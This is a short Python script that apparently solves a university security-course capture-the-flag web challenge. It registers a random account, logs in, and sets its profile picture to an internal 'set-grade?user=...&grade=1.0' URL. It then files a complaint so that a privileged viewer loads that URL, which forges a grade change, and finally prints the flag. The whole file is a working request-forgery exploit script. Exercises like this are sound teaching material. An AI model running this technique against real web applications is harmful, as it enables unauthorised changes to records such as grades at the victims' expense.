import requests
import os
import binascii
import time

session = requests.Session()
host = "https://t7.itsec.sec.in.tum.de/"
global_username = ""
global_password = ""
global_id = ""

# 1, Register
registered = False
while not registered:
	tmp_username = binascii.b2a_hex(os.urandom(32))
	tmp_password = binascii.b2a_hex(os.urandom(32))
	response = session.post(f"{host}register", data={"username": tmp_username, "password": tmp_password})
	if "User created, please log in" in response.text:
		global_username = tmp_username
		global_password = tmp_password
		registered = True
time.sleep(3)

# 2, Login
session.post(f"{host}login", data={"username": global_username, "password": global_password})
time.sleep(3)

# 3, Get ID from URL
tmp_id = requests.post(f"{host}login", data={"username": global_username, "password": global_password})
global_id = tmp_id.url[39:]
time.sleep(3)

# 3, Edit Profile
hack_phrase = f"{host}set-grade?user={global_id}&grade=1.0"
session.post(f"{host}edit", data={"username": global_username, "password": global_password, "picture": hack_phrase})
time.sleep(3)

# 4, Send Complain
session.post(f"{host}complain", data={"complaint": "plz"})
time.sleep(5)

# 5, Fetch Flag
response = session.get(f"{host}")
print(response.text)






